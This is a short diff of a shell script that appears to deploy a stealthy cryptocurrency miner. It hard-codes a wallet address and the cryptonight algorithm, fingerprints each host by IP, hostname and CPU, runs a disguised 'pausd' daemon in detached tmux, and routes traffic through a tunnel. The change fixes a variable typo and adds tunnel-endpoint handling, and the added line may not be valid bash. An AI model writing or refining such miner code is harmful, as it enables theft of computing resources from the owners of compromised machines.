@@ -223,7 +223,7 @@ export \
 ID=${ID:-"{$IPADDR}{$HOSTN}{$DATE}{$CORES}{$CPU}"} \
 PA=${PA:-4ACgpqzFZCiRfmZHAX11tAMLft1KNvLhWh83JXpYFKfKDhT7GXK89AoM4jNV1RRUUghAbuP1FrqTFU5w4zbN3F9GG6mqNPq} \
 AL=${AL:-cryptonight} \
-ENDPOINT=${ENDPONT:-127.0.0.1:${TNL_LISTEN}}
+ENDPOINT=${ENDPOINT:-127.0.0.1:${TNL_LISTEN}}
 
 ## set vars used by pausd daemon in tmux and envsubst
 for v in $(builtin compgen -A variable | grep ^PAUSD); do
@@ -251,8 +251,10 @@ while [ "$(tmx list-panes -t ${PAUSD_DAEMON} | wc -l)" -lt 2 ]; do
         AL="cryptonight-lite"
         ## subst
         cat ${OBJ_MASK}.conf.tpl | envsubst -no-empty > ${OBJ_MASK}.conf
-        ## resetup tunnel to correct target
+        ## resetup tnl to correct target
         lowhw=1 setup_tnl
+        ## update endpoint according to new tnl port
+        ENDPOINT=${${ENDPOINT/:*/}:${TNL_LISTEN}}
         ## init
         tmx kill-session -t ${PAUSD_DAEMON}
         tmx new-session -d -s ${PAUSD_DAEMON} ${PAUSD_DAEMON} ${PAUSD_ARGS}
